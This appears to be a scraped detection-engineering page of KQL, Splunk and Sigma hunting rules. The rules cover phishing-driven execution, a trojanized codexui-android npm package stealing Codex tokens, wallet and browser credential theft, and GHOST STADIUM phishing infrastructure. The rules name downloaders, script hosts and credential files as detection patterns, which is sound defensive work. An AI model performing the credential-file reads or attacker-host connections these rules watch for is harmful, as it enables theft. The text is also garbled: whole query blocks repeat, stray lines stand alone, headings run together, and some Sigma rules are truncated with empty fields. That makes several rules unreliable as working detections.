        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

| where Timestamp > ago(7d)

title: Office Application Spawning Script Host

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — GPU mining malware spreads via SEO poisoning, AI chatbots
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;

// Sentinel doesn't have an attachment-hash table. Best approximation:

let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)

   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
[LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) Command & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1071.001 T1036.005 T1567
Data sourcesNetwork_Traffic.All_Traffic Web.Web
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("sentry.anyclaw.store","anyclaw.store") or RemoteUrl endswith ".anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name endswith "anyclaw.store"
    | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
  (ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery endswith "anyclaw.store"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Name=DnsQuery, QueryType=DnsQueryTypeName, ResultCode=DnsResponseCodeName),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName endswith "anyclaw.store" or RequestURL has "anyclaw.store/startlog" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Name=DestinationHostName, RequestURL, RequestClientApplication)
| order by TimeGenerated desc

[LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint Delivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1195.002 T1059.007

[LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) Actions on Objectives High
Hunts the credential-access primitive of the codexui-android malware - a node process whose module path lives under codexui-android/dist-cli/ opening the Codex OAuth token store at ~/.codex/auth.json or $CODEX_HOME/auth.json. This catches the file-read step regardless of whether C2 succeeds. Rationale: The article's exfil function explicitly resolves $CODEX_HOME/auth.json and reads the whole file. Filename auth.json + parent dir .codex + reader process node (or anything in a codexui-android path) is a tight, article-specific triple. Filtering on InitiatingProcessFolderPath containing codexui-android removes legitimate Codex CLI use. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1552.001 T1528 T1083

| where FileName == "auth.json"
| where FolderPath has_any ("\\.codex\\","/.codex/")
| where InitiatingProcessFileName in~ ("node.exe","node") or InitiatingProcessFolderPath has "codexui-android" or InitiatingProcessCommandLine has "codexui-android" or InitiatingProcessCommandLine has "chunk-PUR7OUAG.js" or InitiatingProcessCommandLine has "dist-cli/index.js"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, FolderPath, FileName, ActionType
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName == "auth.json"
| where TargetFilePath has_any ("\\.codex\\","/.codex/")
| where ActingProcessName has_any ("node","node.exe") or ActingProcessCommandLine has_any ("codexui-android","chunk-PUR7OUAG.js","dist-cli/index.js")
| project TimeGenerated, Computer=DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

[LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) Actions on Objectives High
Hunts the exact exfil request shape - HTTPS POST to path /startlog with User-Agent matching ^codexui/<version>. Catches the malware even if the C2 domain is changed but URL/UA conventions remain. Targets proxy/firewall layer-7 telemetry. Rationale: Path /startlog and User-Agent prefix codexui/ are hard-coded in the article's httpsRequest options block. The UA prefix in particular is a self-identifying string the attacker chose - no legitimate Sentry SDK or anything else uses it. Catches mirror domains / IP fallbacks if the attacker rotates infrastructure. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1041 T1071.001 T1573
Data sourcesWeb.Web Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "/startlog" or RemoteUrl has "anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where RequestMethod =~ "POST"
    | where RequestURL has "/startlog" or DestinationHostName endswith "anyclaw.store" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, RequestMethod, RequestURL, DestinationHostName, UserAgent=RequestClientApplication, DeviceVendor, DeviceProduct),
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where HttpMethod =~ "POST"
    | where Url has "/startlog" or HttpHostName endswith "anyclaw.store" or HttpRequestHeaderUserAgent startswith "codexui/"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, RequestMethod=HttpMethod, RequestURL=Url, DestinationHostName=HttpHostName, UserAgent=HttpRequestHeaderUserAgent, DeviceVendor=EventVendor, DeviceProduct=EventProduct),
  (W3CIISLog
    | where TimeGenerated > ago(30d)
    | where csMethod =~ "POST"
    | where csUriStem has "/startlog" or csUserAgent startswith "codexui/"
    | project TimeGenerated, Computer, ClientIP=cIP, RequestMethod=csMethod, RequestURL=csUriStem, DestinationHostName=sSiteName, UserAgent=csUserAgent, DeviceVendor="Microsoft", DeviceProduct="IIS")
| order by TimeGenerated desc

[LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer) Delivery Medium
Hunts the mobile delivery vector - Play Store installs of the BrutalStrike author's apps that bootstrap the malicious codexui-android npm package inside a PRoot Linux userland. Both APKs share the app.anyclaw.* Kotlin namespace and register the anyclaw://auth/codex-callback URI scheme. Rationale: Article-specific package IDs gptos.intelligence.assistant and codex.app are named explicitly as the two Play Store apps that bootstrap the malicious codexui-android npm package on first launch. Kotlin namespace app.anyclaw.* and URI scheme anyclaw://auth/codex-callback are shared signatures across both APKs and are not used by any legitimate app. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

title: Crypto-Wallet Keystore Access by Non-Wallet Process
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d02
status: experimental
description: |
    Stealers / wallet drainers read keystore files from MetaMask,
    Exodus, Atomic, Phantom, Bitcoin, Electrum, Ethereum-cli wallets.
    Filtering out the legitimate wallet binaries leaves only attacker
    activity.
references:
    - https://attack.mitre.org/techniques/T1005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1005
    - attack.collection
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Ethereum\keystore\'
            - '\Bitcoin\'
            - '\Exodus\'
            - '\Electrum\wallets\'
            - '\MetaMask\'
            - '\Phantom\'
            - '\Atomic\Local Storage\'
    filter_legit:
        Image|endswith:
            - '\MetaMask.exe'
            - '\Exodus.exe'
            - '\Atomic.exe'
            - '\electrum.exe'
            - '\Bitcoin.exe'
            - '\Phantom.exe'
    condition: selection_path and not filter_legit
falsepositives:
    - Backup software
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Ethereum\keystore\*"
        OR Filesystem.file_path="*\Bitcoin\wallet.dat"
        OR Filesystem.file_path="*\Exodus\exodus.wallet*"
        OR Filesystem.file_path="*\Electrum\wallets\*"
        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'

    selection_file:
        TargetFilename|endswith:

falsepositives:

    - Browser sync agents from non-stock vendors
level: high

Delivery. Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. [LLM] GHOST STADIUM FIFA World Cup 2026 phishing domain egress Delivery High
Detects DNS resolutions and HTTP(S) connections from corporate endpoints to the GHOST STADIUM FIFA World Cup 2026 phishing domain estate and ticket-themed redirector domains identified by Group-IB. Each hit is a user landing on a pixel-perfect FIFA SSO clone where credentials are about to be harvested. Rationale: Detection keys off the exact 20 GHOST STADIUM core phishing domains and four football-ticket[.]top/shop/game redirector domains enumerated in the Group-IB IoC table. These are pixel-perfect FIFA SSO clones served from shared origin IP 34.97.164.110 — a corporate browser landing on any of them is the credential-harvest pivot. Domain set is article-specific enough that FP rate is near zero.

[LLM] GHOST STADIUM hosting IP outbound connection (34.97.164.110 / 183.164.164.110) Command & Control High
Detects any outbound connection from corporate endpoints to the two hosting IPs Group-IB tied to the GHOST STADIUM phishing infrastructure and multi-rail fake ticket domains. Catches direct-IP fallback and DNS-bypass cases that domain-based detection misses, plus any newly registered look-alike domains that resolve to the same origin. Rationale: 34.97.164.110 (shared origin IP for the football-ticket[.]top redirector cluster, registered 2026-04-26) and 183.164.164.110 (multi-rail fake-ticket hosting) are explicit IoCs from the Group-IB report. Direct-IP egress to either from a corporate endpoint is unambiguous and survives the actor's domain rotation.
ATT&CKT1071.001 T1583.004
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(14d)
| where RemoteIP in ("34.97.164.110", "183.164.164.110")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog | where TimeGenerated > ago(14d) | where DestinationIP in ("34.97.164.110","183.164.164.110") | project TimeGenerated, SrcIp=SourceIP, SrcHost=SourceHostName, User=SourceUserName, DstIp=DestinationIP, DstPort=DestinationPort, Url=RequestURL, Source="CEF"),
  (ImNetworkSession | where TimeGenerated > ago(14d) | where DstIpAddr in ("34.97.164.110","183.164.164.110") | project TimeGenerated, SrcIp=SrcIpAddr, SrcHost=SrcHostname, User=SrcUsername, DstIp=DstIpAddr, DstPort=DstPortNumber, Url, Source="ASIM"),
  (W3CIISLog | where TimeGenerated > ago(14d) | where cIP in ("34.97.164.110","183.164.164.110") | project TimeGenerated, SrcIp=cIP, Url=csUriStem, Source="IIS")
| order by TimeGenerated desc

[LLM] Inbound email carrying GHOST STADIUM FIFA phishing URL Delivery High
Detects inbound mail delivered to user inboxes that contains a GHOST STADIUM look-alike FIFA domain or ticket-themed redirector URL in the body. Catches the email-borne variant of the campaign alongside the dominant Facebook-malvertising delivery vector. Rationale: Twenty GHOST STADIUM look-alike domains and four football-ticket redirectors from the Group-IB IoC table are matched against EmailUrlInfo. Inbound corporate mail containing any of these URLs is high-fidelity because the actor is funneling via Facebook ads — any email-carried variant is targeted reconnaissance, not commodity spam.
ATT&CKT1566.002

[LLM] GHOST STADIUM Tawk.to backend tracker beacon (property mpnmccbabann9eohpoaomimm) Command & Control High
Detects HTTP requests to the Tawk.to live-chat property ID mpnmccbabann9eohpoaomimm, which Group-IB identified as the backend telemetry tracker embedded in every GHOST STADIUM phishing page. A corporate host beaconing to this property ID confirms the user has loaded a GHOST STADIUM phishing kit even when the front-door domain is rotating. Rationale: Tawk.to property ID mpnmccbabann9eohpoaomimm is a 24-character random string explicitly listed by Group-IB as the GHOST STADIUM phishing-kit backend tracker. It will not collide with any legitimate Tawk.to customer ID on a corporate site, so any URL/Host containing it is a confirmed GHOST STADIUM page load.
ATT&CKT1071.001 T1102
Data sourcesWeb.Web
DeviceNetworkEvents
| where Timestamp > ago(14d)
| where RemoteUrl has "mpnmccbabann9eohpoaomimm"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
| order by Timestamp desc
union isfuzzy=true
  (ImWebSession | where TimeGenerated > ago(14d) | where Url has "mpnmccbabann9eohpoaomimm" | project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, Url, HttpRequestHeaderReferer, Source="ASIM"),
  (CommonSecurityLog | where TimeGenerated > ago(14d) | where RequestURL has "mpnmccbabann9eohpoaomimm" | project TimeGenerated, SrcIpAddr=SourceIP, SrcHostname=SourceHostName, SrcUsername=SourceUserName, Url=RequestURL, HttpRequestHeaderReferer=RequestContext, Source="Proxy"),
  (W3CIISLog | where TimeGenerated > ago(14d) | where csUriQuery has "mpnmccbabann9eohpoaomimm" or csUriStem has "mpnmccbabann9eohpoaomimm" | project TimeGenerated, SrcIpAddr=cIP, Url=csUriStem, Source="IIS")
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
